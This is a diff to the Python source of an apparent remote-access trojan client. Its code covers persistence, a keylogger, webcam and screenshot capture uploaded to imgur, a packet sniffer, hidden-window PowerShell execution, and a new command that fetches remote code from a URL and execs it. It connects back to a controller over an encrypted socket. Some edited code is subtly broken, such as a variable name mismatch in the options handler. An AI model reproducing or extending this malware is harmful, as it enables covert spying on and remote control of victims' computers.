@@ -236,9 +236,7 @@ class Client(object):
         for i in self.threads:
             try:
                 del self.threads[i]
-            except Exception as e1:
-                if self.v:
-                    print 'Kill thread error: {}'.format(str(e1))
+            except: pass
         for method in self.persistence.options['methods']:
             try:
                 getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))()
@@ -248,23 +246,30 @@ class Client(object):
 
     def _use(self, module):
         try:
-            getattr(self, module).status = True
+            getattr(self, module).im_func.status = True
             return "'{}' enabled.".format(module.title())
         except Exception as e:
-            if self.v:
-                print "Error: {}".format(str(e))
+            return "Error: {}".format(str(e))
 
     def _stop(self, module):
         try:
-            getattr(self, module).status = False
+            getattr(self, module).im_func.status = False
             return "'{}' disabled.".format(module.title())
         except Exception as e:
-            if self.v:
-                print "Error: {}".format(str(e))
+            return "Error: {}".format(str(e))
 
     def _options(self, module=None):
-        modules = [_ for _ in self.mods] if not module else [module]
-        return self._show({m: self.mods[m].options for m in modules})
+        try:
+            if not module:
+                modlist = [_ for _ in self.mods]
+            else:
+                if module not in self.mods:
+                    return "'{}' is not a module".format(str(module))
+                modlist = [module]
+            return self._show({m: self.mods[m].options for m in modules})
+        except Exception as e:
+            return 'Option error: {}'.format(str(e))
+            
 
     def _show(self, dict_or_json):
         try:
@@ -306,22 +311,41 @@ class Client(object):
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
-    def _download_module(self, uri, name=None):
-        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
-        module  = new_module(name)
-        source  = request('GET', uri).content
-        code    = compile(source, name, 'exec')
-        exec code in module.__dict__
-        globals()[name] = module
-        sys.modules[name] = module
-        return module
+    def _new(self, args):
+        if ' ' in args and args.split()[0] in ('module','update') and args.split()[1].startswith('http'):
+            action = args.split()[0]
+            target = args.split()[1]
+            try:
+                module = self._new_module(target)
+            except Exception as e:
+                return "Error creating new module: '{}'".format(str(e))
+            if action == 'module':
+                return "New module '{}' successfully created".format(str(module.__name__))
+            elif action == 'update':
+                exec module in globals()
+        else:
+            return "usage: {:>24}\noptions: {:>17}\narguments: {:>29}".format("new <option> [args]", "module, update", "url (must start with 'http')")
+
+    def _new_module(self, uri, *kwargs):
+        try:
+            name    = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
+            module  = new_module(name)
+            source  = request('GET', uri).content
+            code    = compile(source, name, 'exec')
+            exec code in module.__dict__
+            self.mods[name] = module
+            return module
+        except Exception as e:
+            if self.v:
+                print "Error creating module: {}".format(str(e))
 
     def _powershell(self, cmdline):
         try:
+            cmds = cmdline if type(cmdline) is list else str(cmdline).split()
             info = subprocess.STARTUPINFO()
-            info.dwFlags = sub.STARTF_USESHOWWINDOW
-            info.wShowWindow = sub.SW_HIDE
-            command=['powershell.exe', '/c', cmdline]
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+            info.wShowWindow = subprocess.SW_HIDE
+            command=['powershell.exe', '/c', cmds]
             p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
             results, _ = p.communicate()
             return results
@@ -558,7 +582,7 @@ class Client(object):
 
     def webcam_image(self):
         dev = VideoCapture(0)
-        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
+        tmp = mktemp(suffix='.png')
         r,f = dev.read()
         waitKey(1)
         imwrite(tmp, f)
@@ -582,7 +606,7 @@ class Client(object):
 
     def webcam_video(self):
         fpath   = mktemp(suffix='.avi')
-        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
+        fourcc  = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
         output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
         dev     = VideoCapture(0)
         end     = time.time() + 5.0
@@ -782,13 +806,23 @@ class Client(object):
         mx.update({fx.func_name: fx})
         return fx
 
+    def thread_handler(self):
+        while True:
+            if self.exit:
+                break
+            dead_threads = [self.threads.pop(job, None) for job in self.threads if not self.threads[job].is_alive()]
+            for dead in dead_threads:
+                if self.v:
+                    print "Thread '{}' killed".format(dead.name)
+                del dead
+            time.sleep(5)
+
     @module
     def persistence(self):
         for method in self.persistence.options['methods']:
             if method not in self.result['persistence']:
                 result = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
                 self.result['persistence'].update({ method : result })
-        _ = self.threads.pop('persistence', None)
         return result
 
     @module
@@ -798,7 +832,6 @@ class Client(object):
             img = screen.shot(output=tmp)
         result = self._imgur(img)
         self.result['screenshot'].update({ time.ctime() : result })
-        _ =  self.threads.pop('screenshot', None)
         return result
 
     @module
@@ -816,7 +849,6 @@ class Client(object):
             self.threads['keylogger'].start()
             result = 'Keylogger started at {}'.format(time.ctime())
         self.result['keylogger'].update({ time.ctime() : result })
-        _ = self.threads.pop('keylogger', None)
         return result
 
     @module
@@ -825,7 +857,6 @@ class Client(object):
             result = self.webcam_video()
         else:
             result = self.webcam_image()
-        _ = self.threads.pop('webcam', None)
         return result
 
     @module
@@ -839,16 +870,17 @@ class Client(object):
         else:
             result = 'packetsniffer is already monitoring network traffic'
         self.result['packetsniffer'].update({ time.ctime() : result })
-        _ = self.threads.pop('packetsniffer', None)
         return result
 
     @command
     def run_modules(self):
-        [self.threads.update({mod: Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
+        for mod in self.mods:
+             if self.mods[mod].status and sys.platform in self.mods[mod].platforms and mod not in self.threads:
+                self.threads.update({mod: Thread(target=getattr(self, mod), name=mod)})
         for job in self.threads:
             if not self.threads[job].is_alive():
                 self.threads[job].start()
-        for task in jobs:
+        for task in self.threads:
             if task not in ('keylogger','packetsniffer'):
                 self.threads[task].join()
         return self._show(self.result)
@@ -886,12 +918,14 @@ class Client(object):
             else:
                 break
         return self.shell()
-    
+            
     @command
     def start(self):
         try:
-            self.socket = self._connect(host=self._target(o=self.a, p=self.b))
-            self.dhkey  = self._diffiehellman()
+            self.socket  = self._connect(host=self._target(o=self.a, p=self.b))
+            self.dhkey   = self._diffiehellman()
+            self.threads['thread_handler'] = Thread(target=self.thread_handler, name='thread_handler')
+            self.threads['thread_handler'].start()
             while True:
                 if self.exit:
                     break
@@ -940,8 +974,8 @@ class Client(object):
     def cat(self,filename): return open(filename).read(4000) 
 
     @command
-    def download(self,url): return self._download_module(url)
-
+    def new(self, args): return self._new(args)
+    
     @command
     def ls(self, path='.'): return '\n'.join(os.listdir(path))
 
@@ -964,13 +998,13 @@ class Client(object):
     def get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
 
     @command    
-    def status(self): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
+    def status(self,c=None): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0)) if not c else '%d days, %d hours, %d minutes, %d seconds' % (int(c/86400.0), int((c%86400.0)/3600.0), int((c%3600.0)/60.0), int(c%60.0))
 
 # ----------------- MAIN --------------------------
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    return client.start()
+    return client
 
 
 if __name__ == '__main__':
